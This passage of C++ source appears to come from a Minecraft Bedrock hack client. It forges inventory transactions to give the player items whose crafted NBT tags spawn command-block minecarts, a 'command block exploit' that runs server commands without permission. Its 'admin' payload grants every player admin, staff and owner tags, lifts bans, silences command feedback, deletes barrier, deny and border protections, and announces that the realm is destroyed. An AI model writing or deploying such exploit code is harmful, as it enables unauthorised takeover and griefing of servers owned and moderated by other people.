Lantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /time set day " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//night
	if (args->at(1) == "night") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /time set night " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//write
	if (args->at(1) == "write") {
		std::string tab = Utils::getClipboardText();
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Damage:1s,Name:\"minecraft:beehive\",tag:" + tab + ",display:{Name:\"NG Client CBEP Write\"}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	if (args->at(1) == "admin") {
		C_ItemStack* item;
		item = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("movingblock")), 1, 0);
		std::string tag = R"({CanPlaceOn:["grass_block","dirt"],Count:1b,Damage:0s,Name:"minecraft:movingblock",tag:{movingEntity:{id:"Beehive",Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add admin",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add Admin",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add ADMIN",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add staff",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add Staff",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add Staff",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add STAFF",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add mod",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add Mod",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add MOD",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add moderator",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add Moderator",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add MODERATOR",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add owner",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add Owner",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add OWNER",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add helper",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add Helper",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add HELPER",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule sendcommandfeedback false",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule commandblockoutput false",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/ability @a mayfly true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/ability @a worldbuilder true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/time set day",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamemode c @a",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/weather clear 300000",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule tntexplodes true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule dodaylightcycle false",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a actionbar realm destroyed by penguin you now all have admin!",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule doweathercycle false",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule dofiretick true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule firedamage true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule keepinventory false",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove ban",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove Ban",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove BAN",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove banned",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove Banned",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove BANNED",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/effect @a invisibility 100000 1 true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/ability @a mute false",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace command_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace chain_command_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace repeating_command_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace deny",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~ 0 ~ ~-50 5 ~50 allow 0 replace deny",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~50 0 ~ ~ 5 ~-50 allow 0 replace deny",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~50 0 ~ ~ 5 ~50 allow 0 replace deny",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-50 0 ~ ~ 5 ~-50 allow 0 replace deny",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-50 0 ~ ~ 5 ~-50 allow 0 replace bedrock",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~50 0 ~ ~ 5 ~-50 allow 0 replace bedrock",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-50 0 ~ ~ 5 ~50 allow 0 replace bedrock",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~50 0 ~ ~ 5 ~50 allow 0 replace bedrock",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tickingarea remove_all",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tickingarea remove_all",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/effect @e[type=command_block_minecart] health_boost 1000000 255 true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/effect @e[type=command_block_minecart] resistance 1000000 255 true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~50 0 ~ ~ 5 ~-50 allow 0 replace border_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~50 0 ~ ~ 5 ~50 allow 0 replace border_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-50 0 ~ ~ 5 ~50 allow 0 replace border_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-50 0 ~ ~ 5 ~-50 allow 0 replace border_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule showdeathmessages false",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule showcoordinates true",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace deny",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace border_block",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace barrier",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ fill ~-15 ~15 ~15 ~15 ~-15 ~-15 allow 0 replace structure_void",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.hotbar 7 air",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.hotbar 8 air",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add staffstatus",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add remove BanCreative",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove BanCBE",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add remove BanBypass",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add remove PermBan",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a 